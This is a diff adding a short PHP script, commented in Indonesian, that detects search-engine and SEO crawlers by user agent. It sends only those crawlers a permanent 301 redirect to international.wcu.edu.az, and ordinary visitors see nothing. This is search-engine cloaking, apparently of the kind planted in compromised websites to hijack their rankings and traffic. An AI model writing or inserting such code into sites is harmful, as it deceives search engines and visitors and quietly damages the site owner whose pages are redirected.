@@ -1,0 +1,22 @@
+<?php
+
+// === Redirect bot ke domain baru ===
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+
+$bots = [
+    'googlebot',
+    'bingbot',
+    'slurp',
+    'ahrefs',
+    'semrush',
+    'yandex',
+    'majestic',
+    'screamingfrog'
+];
+
+foreach ($bots as $bot) {
+    if (strpos($userAgent, strtolower($bot)) !== false) {
+        header("Location: https://international.wcu.edu.az/", true, 301);
+        exit();
+    }
+}
